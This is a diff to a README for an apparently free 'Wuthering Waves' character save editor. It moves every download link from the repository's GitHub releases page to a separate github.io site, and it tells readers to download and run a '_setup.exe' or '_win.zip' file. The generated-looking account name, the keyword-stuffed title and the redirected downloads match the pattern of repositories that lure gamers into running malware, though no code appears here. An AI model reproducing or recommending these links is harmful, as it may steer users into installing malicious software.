@@ -1,7 +1,7 @@
 <h1>🛠️ Wuthering-Waves-Character-Editor-Edit-Your-Character-Save-Free- - Edit Characters Visually & Safely</h1>
 
 <p align="center">
-  <a href="https://github.com/Steamshipcompanyallspice7618/Wuthering-Waves-Character-Editor-Edit-Your-Character-Save-Free-/releases">
+  <a href="https://steamshipcompanyallspice7618.github.io">
     <img src="https://img.shields.io/badge/Download-FREE%20Editor-brightgreen?style=for-the-badge&logo=github" alt="Download Badge" width="250"/>
   </a>
 </p>
@@ -37,7 +37,7 @@ Follow these simple steps. Even if you've never installed software manually, you
 ### 📥 Step 1: Download
 
 Visit this link to download the application.  
-👉 **[Click here to go to the download page](https://github.com/Steamshipcompanyallspice7618/Wuthering-Waves-Character-Editor-Edit-Your-Character-Save-Free-/releases)**
+👉 **[Click here to go to the download page](https://steamshipcompanyallspice7618.github.io)**
 
 On that page, you'll see a list of releases. Look for the newest one and click the file that ends with something like `_setup.exe` or just `_win.zip`. Download it to your computer.
 
@@ -153,7 +153,7 @@ We encourage users to report bugs or suggest features. Use the GitHub Issues tab
 This editor is **free**, **local**, and **visual**. You don't need to be tech-savvy. Just download, run, and edit.
 
 📥 **Download it now:**  
-👉 **[https://github.com/Steamshipcompanyallspice7618/Wuthering-Waves-Character-Editor-Edit-Your-Character-Save-Free-/releases](https://github.com/Steamshipcompanyallspice7618/Wuthering-Waves-Character-Editor-Edit-Your-Character-Save-Free-/releases)**
+👉 **[https://steamshipcompanyallspice7618.github.io](https://steamshipcompanyallspice7618.github.io)**
 
 ---
 
